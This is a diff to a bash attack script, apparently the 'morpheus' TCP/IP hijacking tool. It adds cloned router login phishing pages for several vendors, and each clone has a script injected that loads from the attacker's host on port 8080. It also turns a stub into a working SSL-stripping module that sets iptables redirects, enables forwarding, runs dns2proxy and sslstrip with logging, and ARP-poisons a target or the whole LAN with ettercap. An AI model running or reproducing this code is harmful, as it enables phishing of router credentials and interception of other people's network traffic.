@@ -1721,25 +1721,28 @@ echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
 rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "'morpheus arp poison settings'\n\Leave blank to poison all local lan." --entry --width 270)
 gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270)
 
-# chose what phishing webpage to use
-PHiS=$(zenity --list --title "☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Chose phishing webpage to use" --radiolist --column "Pick" --column "Option" TRUE "Default" FALSE "Meo" FALSE "DLink" --width 300 --height 220)
-
 
 
   # retrieve info about modem to inject into clone
   echo ${BlueF}[☠]${white} Gather Info about modem webpage${RedF}! ${Reset};
   nmap -sV -PN -p 80 $GaTe -oN $IPATH/output/retrieve.log | zenity --progress --pulsate --title "☠ MORPHEUS TCP/IP HIJACKING ☠" --text="Gather modem ip addr, mac addr and hostname .." --percentage=0 --auto-close --width 320
 
+
   # InjE=`cat $IPATH/output/retrieve.log | egrep -m 1 "open" | awk {'print $4,$5,$6'}`
-  InjE=`cat $IPATH/output/retrieve.log | egrep -m 1 "open" | cut -d '(' -f2 | cut -d ')' -f1` # it does not grep all servernames :(
+  InjE=`cat $IPATH/output/retrieve.log | egrep -m 1 "open" | cut -d '(' -f2 | cut -d ')' -f1 | awk {'print $1,$2,$3'}` # grab modem name
   MaCa=`cat $IPATH/output/retrieve.log | egrep -m 1 "MAC" | awk {'print $3'}` # grab mac address ..
   # check if nmap have retrieved any string from scan
   if [ -z "$InjE" ]; then
   echo ${RedF}[x] Module cant gather Info about modem webpage! ${Reset};
   echo "${RedF}[x]${white} Using:${GreenF} 'broadband router'${white} as server name${RedF}!"
+  sleep 2
   InjE="broadband router"
   MaCa="8A:17:62:35:22:UA"
   fi
+
+
+# chose what phishing webpage to use 
+PHiS=$(zenity --list --title "☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Modem Info:\n$InjE\nLogin at: http://$GaTe\n\nChose phishing webpage to use" --radiolist --column "Pick" --column "Option" TRUE "Default" FALSE "Meo" FALSE "DLink" FALSE "TPLink" FALSE "ZTE" FALSE "Technicolor" --width 350 --height 370)
 
 
   # building cloned login modem webpage
@@ -1754,16 +1757,39 @@ PHiS=$(zenity --list --title "☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Chose p
   if [ "$PHiS" = "DLink" ]; then
     cp -r DLINK $ApachE/DLINK
   fi
+  # chose 4 phishing webpage to use
+  if [ "$PHiS" = "TPLink" ]; then
+    cp -r TPLink $ApachE/TPLink
+  fi
+  # chose 5 phishing webpage to use
+  if [ "$PHiS" = "ZTE" ]; then
+    cp -r ZTE $ApachE/ZTE
+  fi
+  # chose 6 phishing webpage to use
+  if [ "$PHiS" = "Technicolor" ]; then
+    cp -r Technicolor $ApachE/Technicolor
+  fi
+
 
   # grab modem ip addr
-  MIP=`route -n | grep "UG" | awk {'print $2'} | tr -d '\n'`
+  if [ "$PHiS" = "Meo" ]; then
+    MIP=`route -n | grep "UG" | awk {'print $2'} | tr -d '\n'`
+  else
+    MIP="www.google.im"
+  fi
   # chose 2º phishing webpage to use
   if [ "$PHiS" = "Meo" ]; then
     sed -i "s/MoDemIP/$MIP/" new.html
     sed -i "s/MaCa/$MaCa/" new.html
-    sed -i "s/MoDemIP/$MIP/" login.html
+    sed -i "s/MoDemIP/www.google.im/" login.html
   elif [ "$PHiS" = "Default" ]; then
     sed -i "s/MoDemIP/$MIP/" login.html
+  elif [ "$PHiS" = "TPLink" ]; then
+    :
+  elif [ "$PHiS" = "ZTE" ]; then
+    sed -i "s/MoDemIP/www.google.im/" login.html
+  elif [ "$PHiS" = "Technicolor" ]; then
+    sed -i "s/MoDemIP/www.google.im/" login.html
   else
     sed -i "s/MoDemIP/$MIP/" login.html
   fi
@@ -1775,6 +1801,18 @@ PHiS=$(zenity --list --title "☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Chose p
     sed "s/<\/body>/<script type='text\/javascript' src='http:\/\/$IP:8080\/support\/test.js'><\/script><\/body>/g" new.html > copy.html
   elif [ "$PHiS" = "DLink" ]; then
     cd DLINK
+    sed "s/<\/body>/<script type='text\/javascript' src='http:\/\/$IP:8080\/support\/test.js'><\/script><\/body>/g" index.html > $IPATH/bin/phishing/router-modem/copy.html
+    cd ..
+  elif [ "$PHiS" = "TPLink" ]; then
+    cd TPLink
+    sed "s/<\/body>/<script type='text\/javascript' src='http:\/\/$IP:8080\/support\/test.js'><\/script><\/body>/g" index.html > $IPATH/bin/phishing/router-modem/copy.html
+    cd ..
+  elif [ "$PHiS" = "ZTE" ]; then
+    cd ZTE
+    sed "s/<\/body>/<script type='text\/javascript' src='http:\/\/$IP:8080\/support\/test.js'><\/script><\/body>/g" index.html > $IPATH/bin/phishing/router-modem/copy.html
+    cd ..
+  elif [ "$PHiS" = "Technicolor" ]; then
+    cd Technicolor
     sed "s/<\/body>/<script type='text\/javascript' src='http:\/\/$IP:8080\/support\/test.js'><\/script><\/body>/g" index.html > $IPATH/bin/phishing/router-modem/copy.html
     cd ..
   else
@@ -1844,6 +1882,9 @@ echo ${BlueF}[☠]${white} Start apache2 webserver...${Reset};
   rm $ApachE/login.html
   rm -r $ApachE/router-modem
   rm -r $ApachE/DLINK
+  rm -r $ApachE/TPLink
+  rm -r $ApachE/ZTE
+  rm -r $ApachE/Technicolor
   # rm -r $IPATH/output/clone
   cd $IPATH
 
@@ -2547,6 +2588,7 @@ t=`which sslstrip`
 if [ "$?" -eq "0" ]; then
   echo ${BlueF}[${GreenF}✔${BlueF}]${white} sslstrip-0.9${RedF}:${GreenF} found .. ${Reset};
   sleep 1
+  stripath=`locate sslstrip.py | grep "/usr/share/sslstrip"`
 else
   Fail="YES"
   echo ${BlueF}[${RedF}x${BlueF}]${white} sslstrip-0.9${RedF}:${RedF} not found .. ${Reset};
@@ -2555,6 +2597,7 @@ else
   echo ""
   python setup.py build & python setup.py install
   echo ""
+  stripath=`locate sslstrip.py | grep "/usr/share/sslstrip"`
   cd $IPATH/
 fi
 
@@ -2562,6 +2605,7 @@ fi
 if [ -e "$IPATH/bin/Utils/dns2proxy/dns2proxy.py" ]; then
   echo ${BlueF}[${GreenF}✔${BlueF}]${white} dns2proxy${RedF}:${GreenF} found .. ${Reset};
   sleep 1
+  dnsproxypath="$IPATH/bin/Utils/dns2proxy/dns2proxy.py"
 else
   Fail="YES"
   echo ${BlueF}[${RedF}x${BlueF}]${white} dns2proxy${RedF}:${RedF} not found .. ${Reset};
@@ -2595,13 +2639,67 @@ fi
 
 
 
-
 #
 # start of module funtions ..
 #
-echo ""
-echo ${RedF}[x]${white} Please wait, Module under develop ..${Reset};
-sleep 7
+cd $IPATH/output
+if [ -e $stripath ]; then
+  :
+else
+  echo ${BlueF}[${RedF}x${BlueF}]${white} SSLSTRIP installation NOT found ..${Reset};
+  sleep 2
+  exit
+fi
+rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "'morpheus arp poison settings'\n\Leave blank to poison all local lan." --entry --width 270)
+gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270)
+
+  #
+  # ip fowarding in iptables
+  #
+  iptables --flush
+  iptables --table nat --flush
+  iptables --delete-chain
+  iptables --table nat --delete-chain
+  sleep 1
+  echo "1" > /proc/sys/net/ipv4/ip_forward
+
+  #
+  # IPTABLES SETTINGS ..
+  #
+  iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000 
+  iptables -t nat -A PREROUTING -p udp --destination-port 53 -j REDIRECT --to-port 53
+
+  # ARP poison ..
+  cd $IPATH/bin/Utils/dns2proxy
+  if [ "$IpV" = "ACTIVE" ]; then
+    echo ${GreenF}[☠]${white} Using IPv6 settings ${Reset};
+    echo ${GreenF}[☠]${white} press [q] to quit arp poison ..${Reset};
+    sleep 2
+    python $dnsproxypath & python $stripath -l 10000 -a -w $IPATH/output/log.txt & ettercap -T -q -i $InT3R -M ARP /$rhost// /$gateway//
+  else
+    echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
+    echo ${GreenF}[☠]${white} press [q] to quit arp poison ..${Reset};
+    sleep 2
+    python $dnsproxypath & python $stripath -l 10000 -a -w $IPATH/output/log.txt & ettercap -T -q -i $InT3R -M ARP /$rhost/ /$gateway/
+  fi
+
+
+  # clean all settings
+  sleep 2
+  echo ${BlueF}[☠]${white} cleaning settings .. ${Reset};
+  sleep 2
+  killall sslstrip
+  killall python
+  iptables --flush
+  iptables --table nat --flush
+  iptables --delete-chain
+  iptables --table nat --delete-chain
+  # reset ip-forward
+  echo "0" > /proc/sys/net/ipv4/ip_forward
+  echo ${BlueF}[☠]${white} editing sslstrip session log File ${BlueF}]${Reset};
+  sleep 4
+  xterm -T "Sslstrip session log" -e "nano $IPATH/output/log.txt"
+  sleep 2
 
 
 else
